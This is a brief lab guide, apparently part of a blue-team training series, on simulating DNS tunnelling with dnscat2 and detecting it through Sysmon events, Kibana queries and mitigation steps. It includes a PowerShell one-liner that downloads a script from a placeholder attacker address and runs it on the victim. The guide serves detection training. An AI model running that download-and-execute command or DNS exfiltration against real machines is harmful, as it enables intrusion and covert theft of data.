# 🛡️ Scenario 4: DNS Tunneling

## 🎯 Objective

Simulate and detect covert data exfiltration via DNS queries.

---

## 🧪 Attack Simulation with dnscat2

### ✅ On Attacker (Kali)

```bash
dnscat2-server
```

### ✅ On Victim

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/dnscat.ps1')
```

---

## 📊 Detection

### 🧠 Sysmon Event ID

| Event ID | Description             |
|----------|--------------------------|
| 3        | Network connection       |

---

## 🔍 Kibana Query

```kql
winlog.event_id:3 AND dns.question.name.keyword: "*.*"
dns.question.name.keyword: /[a-z0-9]{30,}\./
```

## 🛡️ Mitigation

- Block long or unknown DNS domains.
- Use DNS firewall and Zeek for inspection.
